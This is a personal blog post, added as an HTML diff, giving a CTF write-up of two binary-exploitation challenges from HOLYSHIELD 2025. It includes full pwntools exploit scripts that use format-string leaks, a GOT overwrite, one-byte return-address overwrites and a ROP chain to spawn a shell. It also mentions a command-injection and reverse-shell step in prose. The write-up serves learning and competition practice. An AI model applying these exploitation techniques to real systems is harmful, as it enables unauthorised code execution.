@@ -1,0 +1,225 @@
+<!doctype html>
+<html lang="en" data-theme="light"><head>
+  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>HOLYSHIELD 2025 Writeup · whrds.log</title><meta name="description" content="A college junior contacted me to participate in the last CTF of undergraduate students, so I decided to just have fun, but the kids were sincere, so I participated while concentrating for the first time in a while... but I ended up getting on the bus unintentionally. There were a total of 3 problems in the PWN field. If you summarize the types, v8, rop, tapo 1-day reproduction? one problem">
+  <meta name="theme-color" content="#f7f7f3"><link rel="canonical" href="https://whrds.github.io/en/posts/holyshield-2025-writeup/">
+  <link rel="alternate" hreflang="en" href="https://whrds.github.io/en/posts/holyshield-2025-writeup/"><link rel="alternate" hreflang="ko" href="https://whrds.github.io/ko/posts/holyshield-2025-writeup/">
+  <meta property="og:type" content="article"><meta property="og:title" content="HOLYSHIELD 2025 Writeup · whrds.log"><meta property="og:description" content="A college junior contacted me to participate in the last CTF of undergraduate students, so I decided to just have fun, but the kids were sincere, so I participated while concentrating for the first time in a while... but I ended up getting on the bus unintentionally. There were a total of 3 problems in the PWN field. If you summarize the types, v8, rop, tapo 1-day reproduction? one problem"><meta property="og:url" content="https://whrds.github.io/en/posts/holyshield-2025-writeup/">
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="/assets/styles.css">
+  <script>try{const t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;else if(matchMedia('(prefers-color-scheme:dark)').matches)document.documentElement.dataset.theme='dark'}catch(e){}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"HOLYSHIELD 2025 Writeup","description":"A college junior contacted me to participate in the last CTF of undergraduate students, so I decided to just have fun, but the kids were sincere, so I participated while concentrating for the first time in a while... but I ended up getting on the bus unintentionally. There were a total of 3 problems in the PWN field. If you summarize the types, v8, rop, tapo 1-day reproduction? one problem","datePublished":"2025-12-28","inLanguage":"en","url":"https://whrds.github.io/en/posts/holyshield-2025-writeup/","author":{"@type":"Person","name":"whrds"}}</script>
+</head><body>
+  <a class="skip-link" href="#main">Skip to content</a>
+  <header class="site-header"><div class="shell header-inner">
+    <a class="brand" href="/en/" aria-label="whrds.log home"><span class="brand-mark">W_</span><span class="brand-text">whrds.log</span></a>
+    <nav class="main-nav" aria-label="Main navigation">
+      <a href="/en/" aria-current="page">Notes</a>
+      <a href="/en/about/">About</a>
+    </nav>
+    <div class="header-tools">
+      <div class="language-switch" aria-label="Language">
+        <a href="/ko/posts/holyshield-2025-writeup/" class="" lang="ko">KO</a>
+        <a href="#" class="active" lang="en" aria-current="true">EN</a>
+      </div>
+      <button class="icon-button" type="button" data-theme-toggle aria-label="Use dark theme">◐</button>
+    </div>
+  </div></header>
+  <main id="main"><article class="article-wrap"><header class="article-header"><p class="eyebrow">Security research notes</p><h1>HOLYSHIELD 2025 Writeup</h1><p class="article-description">A college junior contacted me to participate in the last CTF of undergraduate students, so I decided to just have fun, but the kids were sincere, so I participated while concentrating for the first time in a while... but I ended up getting on the bus unintentionally. There were a total of 3 problems in the PWN field. If you summarize the types, v8, rop, tapo 1-day reproduction? one problem</p><div class="article-meta"><time datetime="2025-12-28">Dec 28, 2025</time><span>·</span><span>5 min read</span></div></header><div class="prose"><p>A junior in college contacted me asking me to participate in the last CTF as an undergraduate student, so I decided to participate.</p>
+<p>So I thought I should just have fun with them, but the kids were sincere, so I participated and focused for the first time in a while…</p>
+<p>I ended up getting on the bus unintentionally.</p>
+<hr>
+<p>There were a total of 3 problems in the PWN field. If you summarize the types, can you reproduce v8, rop, and tapo 1-day? It was a problem.</p>
+<p>The competition was held from 09:00 to 18:00 in the morning, and during this time, we only focused on one problem.</p>
+<p>It’s not just me, my friends who participated in the competition all said that they were so busy solving this problem that they couldn’t see the other problems.</p>
+<p>The person who solved the most problems was the person who solved only one problem, but that was only one person.</p>
+<hr>
+<h3>AVOTAPO</h3>
+<p><img src="/assets/images/tistory/tistory-a9f7e62c938c/001.png" alt=""></p>
+<p>The problem that most of the players who participated in the competition similar to mine had…</p>
+<p>If you download the attached file, you can see that there are two paths.</p>
+<p>The camera path contains files that build a web page, but since the IP and port provided are not web, you must look at the files in the chall path first.</p>
+<p><img src="/assets/images/tistory/tistory-a9f7e62c938c/002.png" alt=""></p>
+<p>When the binary is executed, an ID value is input from the user.</p>
+<p>At this time, it is checked whether the input value is the ‘happysmile’ string. At this time, there is no verification as to whether another string follows this string.</p>
+<p>An fsb vulnerability occurs after string verification.</p>
+<p><img src="/assets/images/tistory/tistory-a9f7e62c938c/003.png" alt=""></p>
+<p>In administrator(), subsequent actions are determined through a switch statement. At this time, if 2 comes in, pwn() can be executed.</p>
+<p><img src="/assets/images/tistory/tistory-a9f7e62c938c/004.png" alt=""></p>
+<p>In pwn(), you can decide whether to overwrite only 1 byte or 8 bytes depending on the ck value.</p>
+<p>Here, the ck value changes after performing one operation, but since it ends immediately afterwards, the function must be repeated more than twice.</p>
+<p>First, you need to use the first vulnerability, fsb, to rescue canary, pie, libc, and stack.</p>
+<p>Afterwards, you have to come to pwn(), modulate 1 byte of the stack ret, and run it again.</p>
+<p>Afterwards, you can use 8 byte overwrite to get overwrite puts@got.</p>
+<pre><code>from pwn import *
+
+target = b'./prob'
+
+p = process(target)
+p = remote(&quot;&lt;target_ip&gt;&quot;,&lt;port&gt;)
+#p = remote('127.0.0.1',9000)
+e = ELF(b'./libc.so.6')
+
+passkey = b&quot;happysmile &quot;
+passkey += b&quot;%15$p &quot;
+passkey += b&quot;%20$p &quot;
+passkey += b&quot;%23$p &quot;
+passkey += b&quot;%1$p &quot;
+
+p.sendlineafter(b&quot;ID : &quot;,passkey)
+p.recvuntil(b&quot;0x&quot;)
+
+cny = int(p.recvn(16),16)
+print(&quot;cny = &quot;,hex(cny))
+
+p.recvuntil(b&quot;0x&quot;)
+pie_base = int(p.recvn(12),16) - 0x33b0
+print(&quot;pie_base = &quot;,hex(pie_base))
+
+p.recvuntil(b&quot;0x&quot;)
+libc_base = int(p.recvn(12),16) - 0x29d90
+print(&quot;libc_base = &quot;,hex(libc_base))
+
+p.recvuntil(b&quot;0x&quot;)
+stack = int(p.recvn(12),16) +0x20f8 #- 0x28 #0x3a1
+print(&quot;stack_addr =&quot;, hex(stack))
+
+p.sendlineafter(b&quot;&gt;&gt; &quot;,b&quot;2&quot;)
+
+puts_got = pie_base + 0x35c8 #e.got['puts']
+print(&quot;puts_got = &quot;,hex(puts_got))
+
+p.recvuntil(&quot;pwn pwn!&quot;)
+
+p.sendline(str(stack).encode())
+p.sendline(str(0x30).encode())
+
+p.sendlineafter(b&quot;&gt;&gt; &quot;,b&quot;2&quot;)
+
+p.recvuntil(&quot;pwn pwn!&quot;)
+p.sendline(str(puts_got).encode())
+p.sendline(str(libc_base + 0xebc85).encode())
+
+p.interactive()
+</code></pre>
+<p>After obtaining the shell from the first binary like this, you need to look at the internal log file.</p>
+<p>There was a hint here about ffmpeg including a specific IP, but when I saw this, I wondered if I should select the flag as the media, but I didn’t try it. I should have tried it…</p>
+<p>To summarize the solution, the IP obtained here is a web server, and a command injection vulnerability exists here. Trigger a reverse shell here… and pull the video through ffmpeg, and that’s it… I can’t believe it was really this…</p>
+<hr>
+<h3>Buffer_One_Flow</h3>
+<p>I couldn’t solve this problem during the competition due to time constraints, but I tried to solve it after the competition ended.</p>
+<p>In relation to this, the solver code and official writeup were uploaded one by one on the competition Discord and Git, but they do not work in my environment??</p>
+<p>I even built and ran Docker, but it didn’t work, so I just unpacked it again.</p>
+<p>The problem code is really simple.</p>
+<p><img src="/assets/images/tistory/tistory-a9f7e62c938c/005.png" alt=""></p>
+<p>This code is just the core code and can be considered the entire binary.</p>
+<p>If you allocate a buffer of 16 bytes and think of 0x8 as sfp, 0x24, that is, 0x18, is up to sfp. Afterwards, only 1 byte of ret can be overwritten.</p>
+<p><img src="/assets/images/tistory/tistory-a9f7e62c938c/006.png" alt=""></p>
+<p>You may wonder what you can do with just overwriting 1 byte, but there is more you can do than you think.</p>
+<p>All vulnerable functions, from vuln() to main(), can be accessed by modifying just 1 byte.</p>
+<p>There are too many things to first obtain in order to obtain the shell here.</p>
+<p><img src="/assets/images/tistory/tistory-a9f7e62c938c/007.png" alt=""></p>
+<p>NX-Bit and PIE are activated and got overwrite is not possible.</p>
+<p>Therefore, libc, pie, and stack must all be saved.</p>
+<p><img src="/assets/images/tistory/tistory-a9f7e62c938c/008.png" alt=""></p>
+<p>When entering 0x19 byte, you can manipulate 1 byte and change ret to the starting address of main() or another function.</p>
+<p>If you input 0x19 byte like that, ret will be output due to off-by-one.</p>
+<p>Then, you can naturally find pie_base.</p>
+<p>Afterwards, by repeatedly using the stack created, fill 0x18 with one of _start(), main(), and vuln(), and overwrite up to 1 byte several times, you can see a nice-looking structure in memory.</p>
+<p>libc section address</p>
+<p>dummy#1</p>
+<p>dummy#2</p>
+<p>pie section address</p>
+<p>If you can manipulate sfp with dummy#2 using this section, you can obtain libc from vuln(), which outputs from rbp+0x10 (stack grows from high to low numbers!).</p>
+<p><img src="/assets/images/tistory/tistory-a9f7e62c938c/009.png" alt=""></p>
+<p>To do this, you need to find the stack address. While outputting the stack address, it must be retred to one of main(), vuln(), or _start() at the same time.</p>
+<p>In this part, the stack was created as shown below in the section where data was repeatedly sent, so you can use this part.</p>
+<p><img src="/assets/images/tistory/tistory-a9f7e62c938c/010.png" alt=""></p>
+<p>Once you have obtained everything, all you have to do is form a ROP chain and obtain a shell.</p>
+<pre><code>from pwn import*
+
+target = b'./chall'
+
+p = process(target)
+e = ELF(target)
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
+#context.log_level='debug'
+
+payload = b'a'*0x18
+payload += b'\x9a'
+
+################## pie base leak ###############
+p.send(payload)
+
+p.recvuntil(b'a'*0x18)
+pie_base = u64(p.recvn(6)+b'\x00\x00') - 0x000000000000119a
+
+print(&quot;pie_base = &quot;, hex(pie_base))
+
+################## stack addr leak  #############
+payload = p64(pie_base + 0x4110)
+payload += p64(pie_base + 0x1080)*0x2
+payload += b'\x9a'
+
+for i in range(10):
+    p.send(payload)
+
+payload = p64(pie_base+0x1080)*0x3
+payload += b'\x9a'
+for i in range(10):
+    p.send(payload)
+payload = b'c'*0x10
+pause()
+p.send(payload)
+
+p.recvuntil(b'c'*0x10)
+stack = u64(p.recvn(6) + b'\x00'*2)
+print(&quot;stack_addr = &quot;, hex(stack))
+
+################### libc base leak  ##############
+
+payload = p64(pie_base + e.sym['main'])*2
+payload += p64(stack-0xe8)
+payload += b'\x8b'
+p.send(payload)
+
+p.recvn(8)
+libc_base = u64(p.recvn(6)+b'\x00'*2) - 0x202030
+print(&quot;libc_base = &quot;,hex(libc_base))
+
+#################################################
+
+system = libc_base + libc.sym['system']
+binsh = libc_base + list(libc.search(&quot;/bin/sh\x00&quot;))[0]
+p_rdi = libc_base + 0x000000000010f78b
+
+print(&quot;system_addr = &quot;,hex(system))
+print(&quot;binsh_addr = &quot;,hex(binsh))
+print(&quot;p_rdi_adr = &quot;,hex(p_rdi))
+
+payload = b'a'*0x10
+payload += p64(system)
+payload += b'\x9a'
+p.send(payload)
+
+payload = b'b'*0x10
+payload += p64(binsh)
+payload += b'\x9a'
+p.send(payload)
+
+payload = b'c'*0x10
+payload += p64(p_rdi)
+payload += b'\x9a'
+p.send(payload)
+
+payload = b'd'*0x18
+payload += p64(pie_base + 0x11b2)
+p.send(payload)
+
+p.interactive()
+</code></pre>
+<p>Hmm… It was simpler with the official list, but it doesn’t work in my environment… so I tried this method…</p>
+</div><div class="article-end"><a href="/en/">← View all notes</a><a href="/ko/posts/holyshield-2025-writeup/" hreflang="ko">Read this post in Korean →</a></div></article></main>
+  <footer class="site-footer"><div class="shell footer-inner"><span>© 2026 whrds</span><span>Observe, verify, document.</span><a href="/en/feed.xml">RSS</a></div></footer>
+  <script src="/assets/app.js" defer></script>
+</body></html>
